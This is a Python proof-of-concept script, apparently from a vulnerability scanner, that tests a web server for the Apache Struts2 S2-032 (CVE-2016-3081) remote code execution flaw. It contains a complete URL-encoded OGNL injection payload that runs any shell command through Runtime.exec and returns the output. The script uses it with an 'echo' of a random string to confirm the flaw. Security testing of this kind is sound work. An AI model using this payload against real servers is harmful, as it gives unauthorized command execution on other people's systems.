#!/usr/bin/env python3

import random
import string
import requests

class S2_032_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-032漏洞,又名CVE-2016-3081漏洞',
            'description': 'Struts2 S2-032漏洞可执行任意命令,影响范围为: Struts 2.3.20 - Struts Struts 2.3.28 (2.3.20.3和2.3.24.3除外)',
            'date': '2016-04-19',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.capta = self.get_capta() 
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
            'Connection': "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        self.payload = '''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd={cmd}'''
    
    def get_capta(self):
        
        """
        获取一个随机字符串

        :param:

        :return str capta: 生成的字符串
        """

        capta = ''
        words = ''.join((string.ascii_letters,string.digits))
        for i in range(8):
            capta = capta + random.choice(words)
        return capta

    def run(self):

        """
        检测是否存在漏洞

        :param:

        :return str True or False
        """

        try:
            check_req = requests.get(self.url + self.payload.format(cmd = 'echo ' + self.capta), headers = self.headers)
            if self.capta in check_req.text and len(check_req.text) < 100:
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_032 = S2_032_BaseVerify('http://localhost:8080/s2_032_war_exploded/index.action')
    print(S2_032.run())